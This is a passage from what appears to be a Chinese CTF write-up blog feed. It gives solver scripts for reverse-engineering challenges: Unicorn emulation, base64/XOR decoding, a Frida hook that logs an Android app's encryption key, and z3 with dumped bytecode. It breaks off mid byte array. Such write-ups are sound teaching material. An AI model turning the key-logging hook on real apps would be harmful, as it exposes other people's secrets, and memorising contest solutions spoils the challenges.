class="hljs python"><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>score = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>        <span class="hljs-keyword">return</span> fp.read()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_code</span>(<span class="hljs-params">mu, address, size, user_data</span>):</span><br>    <span class="hljs-comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; % (address, size))</span><br>    <span class="hljs-comment">#bytes = mu.mem_read(address, 20)</span><br>    <span class="hljs-comment">#print(&#x27;地址:%x, 内容:%s&#x27; % (address, binascii.b2a_hex(bytes)))</span><br><br>    <span class="hljs-keyword">if</span> address == <span class="hljs-number">0x4017ac</span>:<br>        mu.reg_write(UC_X86_REG_EAX, <span class="hljs-number">0x500000</span>)<br>        mu.reg_write(UC_X86_REG_ECX, <span class="hljs-number">0x500000</span>)<br>        mu.reg_write(UC_X86_REG_EIP, <span class="hljs-number">0x4017b2</span>)<br>    <span class="hljs-keyword">if</span> address == <span class="hljs-number">0x401c2f</span>:<br>        eax = mu.reg_read(UC_X86_REG_EAX)<br>        result = u32(mu.mem_read(BASE+<span class="hljs-number">0x10004c</span>,<span class="hljs-number">4</span>))<br>        <span class="hljs-keyword">if</span> eax == <span class="hljs-number">0x1a8cd</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;score: &quot;</span> + <span class="hljs-built_in">hex</span>(result))<br>            <span class="hljs-keyword">global</span> score<br>            score = result<br>            mu.reg_write(UC_X86_REG_EIP, <span class="hljs-number">0x401c31</span>)<br>        <span class="hljs-keyword">else</span>:<br>            mu.mem_write(BASE+<span class="hljs-number">0x10004c</span>, p32(result+<span class="hljs-number">1</span>))<br>            mu.reg_write(UC_X86_REG_EIP, <span class="hljs-number">0x4017ac</span>)<br><br><span class="hljs-comment"># 模拟器开始的内存地址</span><br>BASE = <span class="hljs-number">0x400000</span><br>STACK_ADDR = <span class="hljs-number">0Xf00000</span><br><span class="hljs-comment">#栈大小</span><br>STACK_SIZE = <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>  <span class="hljs-comment"># 1MB</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Emulate revers2.exe:&quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment">#初始化模拟器为x86_32</span><br>    mu = Uc(UC_ARCH_X86, UC_MODE_32)<br>    <span class="hljs-comment">#为这个模拟器分配1M内存</span><br>    mu.mem_map(BASE, <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>, UC_PROT_ALL)<br>    mu.mem_map(STACK_ADDR, STACK_SIZE)<br>    <span class="hljs-comment">#将程序内容写入内存</span><br>    mu.mem_write(BASE, read(<span class="hljs-string">&quot;./revers2.exe&quot;</span>))<br>    mu.mem_write(BASE+<span class="hljs-number">0x10004c</span>, <span class="hljs-string">b&quot;\x00\x00\x00\x00&quot;</span>)<br>    mu.mem_write(<span class="hljs-number">0x40733c</span>, <span class="hljs-string">b&quot;\x00\x00\x00\x3f\x00\x00\xc0\x3f\x00\x00\xa0\x40\x00\x00\x20\x41\x80\x96\x18\x4b&quot;</span>)<br>    mu.reg_write(UC_X86_REG_ESP, STACK_ADDR + STACK_SIZE - <span class="hljs-number">1</span>)<br>    mu.hook_add(UC_HOOK_CODE, hook_code)<br>    mu.emu_start(<span class="hljs-number">0x4017ac</span>, <span class="hljs-number">0x401c31</span>)<br><br><span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ERROR: %s&quot;</span> % e)<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br>a1 = score ^ <span class="hljs-number">0xAC0B</span><br><span class="hljs-keyword">while</span>(score):<br>    v9 = score % <span class="hljs-number">8</span> + <span class="hljs-number">48</span><br>    flag += <span class="hljs-built_in">chr</span>(v9)<br>    score //= <span class="hljs-number">8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&#123;&quot;</span> + <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">hex</span>(a1)[<span class="hljs-number">2</span>:]))) + flag + <span class="hljs-string">&quot;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯逆向部分wp</title>
    <link href="/2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%80%86%E5%90%91%E9%83%A8%E5%88%86wp/"/>
    <url>/2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%80%86%E5%90%91%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="babysmc"><a href="#babysmc" class="headerlink" title="babysmc"></a>babysmc</h1><p>有一个smc，</p><p><img src="/2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%80%86%E5%90%91%E9%83%A8%E5%88%86wp/image-20210914104053509.png" alt="image-20210914104053509"></p><p>没发现反调试，直接调试解smc，调试直接跳过了一大串代码，来到关键处。</p><p><img src="/2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%80%86%E5%90%91%E9%83%A8%E5%88%86wp/image-20210914104718244.png" alt="image-20210914104718244"></p><p>类似base64，不过加了个异或。</p><p>写脚本解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>base_table = [<br>        <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xCD</span>,<br>        <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xD5</span>,<br>        <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xDD</span>,<br>        <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x8E</span><br>]<br>base_table_str = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(base_table)):<br>    base_table_str.append(<span class="hljs-built_in">chr</span>(base_table[i]))<br>a = <span class="hljs-string">&quot;H&gt;oQn6aqLr&#123;DH6odhdm0dMe`MBo?lRglHtGPOdobDlknejmGI|ghDb&lt;4&quot;</span><br>tmp = [<span class="hljs-number">0xa6</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xac</span>]<br>a_res = []<br>ss = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)-<span class="hljs-number">1</span>):<br>    a_res.append(<span class="hljs-built_in">ord</span>(a[i])^tmp[i%<span class="hljs-number">4</span>])<br>    ss.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i])^tmp[i%<span class="hljs-number">4</span>]))<br><span class="hljs-built_in">print</span>(ss)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(ss))<br><span class="hljs-comment"># for i in range(len(ss)):</span><br><span class="hljs-comment">#     print(&quot;\\x&quot; + (hex(ord(ss[i]))[2:].rjust(2,&#x27;0&#x27;)), end=&quot;&quot;)</span><br><span class="hljs-comment"># aa = &quot;\xee\x9d\xc3\xf8\xc8\x95\xcd\xd8\xea\xd1\xd7\xed\xee\x95\xc3\xcd\xce\xc7\xc1\x99\xc2\xee\xc9\xc9\xeb\xe1\xc3\x96\xca\xf1\xcb\xc5\xee\xd7\xeb\xf9\xe9\xc7\xc3\xcb\xe2\xcf\xc7\xc7\xc3\xc9\xc1\xee\xef\xdf\xcb\xc1\xe2\xc1\x90\x9d&quot;</span><br>aa_tmp = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ss)):<br>    aa_tmp.append(base_table_str.index(ss[i]))<br><span class="hljs-built_in">print</span>(aa_tmp)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(aa_tmp))<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">52</span>, <span class="hljs-number">4</span>):<br>    f1 = (aa_tmp[i] &lt;&lt; <span class="hljs-number">2</span>) | ((aa_tmp[i+<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">3</span>)<br>    f2 = ((aa_tmp[i+<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) | ((aa_tmp[i+<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xf</span>)) &amp; <span class="hljs-number">0xff</span><br>    f3 = ((aa_tmp[i+<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">6</span>) | (aa_tmp[i+<span class="hljs-number">3</span>] &amp; <span class="hljs-number">0x3f</span>)) &amp; <span class="hljs-number">0xff</span><br>    flag += <span class="hljs-built_in">chr</span>(f1) + <span class="hljs-built_in">chr</span>(f2) + <span class="hljs-built_in">chr</span>(f3)<br>f1 = (aa_tmp[<span class="hljs-number">52</span>] &lt;&lt; <span class="hljs-number">2</span>) | ((aa_tmp[<span class="hljs-number">53</span>] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">3</span>)<br>f2 = ((aa_tmp[<span class="hljs-number">53</span>] &lt;&lt; <span class="hljs-number">4</span>) | ((aa_tmp[<span class="hljs-number">54</span>] &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xf</span>)) &amp; <span class="hljs-number">0xff</span><br>flag += <span class="hljs-built_in">chr</span>(f1) + <span class="hljs-built_in">chr</span>(f2)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="ez-android"><a href="#ez-android" class="headerlink" title="ez_android"></a>ez_android</h1><p>mainactivity：</p><p><img src="/2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%80%86%E5%90%91%E9%83%A8%E5%88%86wp/image-20210914105039787.png" alt="image-20210914105039787"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">ss=<span class="hljs-string">&quot;c232666f1410b3f5010dc51cec341f58&quot;</span><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ss),<span class="hljs-number">2</span>):<br>    res += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;0x&quot;</span> + ss[i:i+<span class="hljs-number">2</span>], <span class="hljs-number">16</span>) + <span class="hljs-number">1</span>)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;0&quot;</span>)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><p><img src="/2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%80%86%E5%90%91%E9%83%A8%E5%88%86wp/image-20210914105119187.png" alt="image-20210914105119187"></p><p>得到用户名密码。</p><p>然后frida hook获取key：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> ByteString = Java.use(<span class="hljs-string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);<br>        Java.use(<span class="hljs-string">&quot;top.zjax.login.EncodeUtils&quot;</span>).encode.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">x, y, z</span>)</span>&#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;start......&quot;</span>);<br>            <span class="hljs-keyword">var</span> result = <span class="hljs-built_in">this</span>.encode(x, y, z);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;arg:&quot;</span>, ByteString.of(x), y, ByteString.of(z).hex());<br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>    &#125;)<br>&#125;<br>setImmediate(main)<br></code></pre></td></tr></table></figure><p><img src="/2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%80%86%E5%90%91%E9%83%A8%E5%88%86wp/image-20210914105248930.png" alt="image-20210914105248930"></p><p>就是一个换表base64,key就是被替换的表，解密即可。</p><h1 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h1><p><img src="/2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%80%86%E5%90%91%E9%83%A8%E5%88%86wp/image-20210914105428528.png" alt="image-20210914105428528"></p><p>xxtea加密，也不管他改没改了，调试直接dump代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># ss = [0x55, 0x89, 0xE5, 0x53, 0x83, 0xEC, 0x34, 0x8B, 0x45, 0x08, 0x89, 0x45, 0xD4, 0x65, 0xA1, 0x14, 0x00, 0x00, 0x00, 0x89, 0x45, 0xF4, 0x31, 0xC0, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x71, 0x75, 0x2F, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x18, 0x8D, 0x50, 0xFC, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x18, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x18, 0x8B, 0x55, 0xD4, 0x8B, 0x52, 0x20, 0x8B, 0x52, 0x01, 0x89, 0x10, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x05, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x41, 0x75, 0x23, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x08, 0x01, 0xC2, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x42, 0x75, 0x23, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x10, 0x29, 0xC2, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x43, 0x75, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x0C, 0x0F, 0xAF, 0xD0, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x37, 0x75, 0x1B, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x14, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x38, 0x75, 0x23, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x10, 0x31, 0xC2, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x39, 0x75, 0x23, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x14, 0x31, 0xC2, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x35, 0x75, 0x1B, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x14, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xF7, 0x75, 0x23, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x04, 0x01, 0xC2, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x44, 0x75, 0x2A, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x04, 0x8B, 0x55, 0xD4, 0x8B, 0x5A, 0x14, 0xBA, 0x00, 0x00, 0x00, 0x00, 0xF7, 0xF3, 0x89, 0xC2, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x80, 0x75, 0x33, 0x8B, 0x5D, 0xD4, 0x83, 0xEC, 0x08, 0x6A, 0x01, 0xFF, 0x75, 0xD4, 0xE8, 0x9E, 0xFD, 0xFF, 0xFF, 0x83, 0xC4, 0x10, 0xC1, 0xE0, 0x02, 0x8D, 0x14, 0x03, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8B, 0x40, 0x02, 0x89, 0x02, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x06, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x77, 0x75, 0x23, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x24, 0x31, 0xC2, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x53, 0x75, 0x27, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x0C, 0x0F, 0xB6, 0x00, 0x0F, 0xBE, 0xC0, 0x83, 0xEC, 0x0C, 0x50, 0xE8, 0x4A, 0xFB, 0xFF, 0xFF, 0x83, 0xC4, 0x10, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x02, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x22, 0x75, 0x25, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x08, 0x89, 0xC1, 0xD3, 0xEA, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x23, 0x75, 0x25, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x08, 0x89, 0xC1, 0xD3, 0xE2, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x99, 0x0F, 0x84, 0x70, 0x04, 0x00, 0x00, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x76, 0x75, 0x38, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x18, 0x8B, 0x10, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x0C, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x18, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x18, 0x8D, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x18, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x05, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x54, 0x75, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x0C, 0x89, 0x45, 0xE0, 0xE8, 0x03, 0xFA, 0xFF, 0xFF, 0x89, 0xC2, 0x8B, 0x45, 0xE0, 0x88, 0x10, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x02, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x30, 0x75, 0x23, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x08, 0x09, 0xC2, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x31, 0x75, 0x23, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x08, 0x21, 0xC2, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x32, 0x75, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x83, 0xC0, 0x01, 0x0F, 0xB6, 0x00, 0x0F, 0xB6, 0xD0, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x0C, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x02, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x09, 0x75, 0x19, 0x8B, 0x45, 0xD4, 0xC7, 0x40, 0x04, 0x67, 0xF9, 0xEB, 0x6F, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x10, 0x75, 0x1B, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x33, 0x75, 0x1B, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x10, 0x8B, 0x45, 0xD4, 0x8B, 